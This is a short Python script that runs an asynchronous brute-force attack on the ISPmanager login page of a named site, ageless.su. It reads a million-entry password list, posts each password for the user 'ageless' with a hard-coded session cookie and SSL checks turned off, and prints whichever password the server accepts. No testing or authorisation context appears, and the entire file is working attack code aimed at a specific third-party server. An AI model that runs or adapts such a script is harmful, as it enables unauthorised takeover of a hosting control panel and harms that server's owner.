import asyncio
import async_timeout
import multiprocessing
from aiohttp import ClientSession, TCPConnector

variable = multiprocessing.Value('i', 0)
fp = open('/home/andrew/SecLists/Passwords/10_million_password_list_top_1000000.txt')  # open file on read mode
lines = fp.read().split("\n")  # create a list containing all lines
fp.close()  # close file

total = len(lines)
headers = {
# "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
"Accept-Encoding":"gzip, deflate, br",
"Accept-Language":"en-US,en;q=0.8,ru;q=0.6",
"Cache-Control":"no-cache",
"Connection":"keep-alive",
# "Content-Length":"64",
# "Content-Type":"application/x-www-form-urlencoded",
"Cookie":"bbsessionhash:74cb4c1b268fe7cf7a9cbc327da2eb29; bblastvisit=1498315756; bblastactivity=0; __utma=122094875.1099785114.1498315826.1498315826.1498315826.1; __utmb=122094875.1.10.1498315826; __utmc=122094875; __utmz=122094875.1498315826.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); ispmgr4=sirius:en:0",
"Host":"ageless.su",
"Origin":"https://ageless.su",
"Pragma":"no-cache",
"Referer":"https://ageless.su/manager/ispmgr",
"Save-Data":"on",
"Upgrade-Insecure-Requests":"1",
"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3063.4 Safari/537.36",
}
url='https://ageless.su/manager/ispmgr'

async def lol():
	conn = TCPConnector(verify_ssl=False)
	async with ClientSession(connector=conn,loop=asyncio.get_event_loop()) as session:
		tasks = []
		for password in lines:
			tasks.append(fetch(session, password))
		return await asyncio.gather(*tasks)

async def fetch(session, password):
	try:
		with async_timeout.timeout(10):
			async with session.post(url, data={
				"username": "ageless",
				"password": password,
				"theme": "sirius",
				"lang": "en",
				"func": "auth",
			}, headers=headers) as response:
				result = await response.text()
				variable.value = variable.value + 1
				if 'Invalid password' in result:
					print('Incorrect {}   {}/{}'.format(password, variable.value ,total))
				else:
					print('!!!!Correct {}   {}/{}'.format(password, variable.value, total))
	except Exception as e:
		print("Error {}    {}/{}".format(e, variable.value, total))


loop = asyncio.get_event_loop()
results = loop.run_until_complete(lol())
loop.close()
print(results)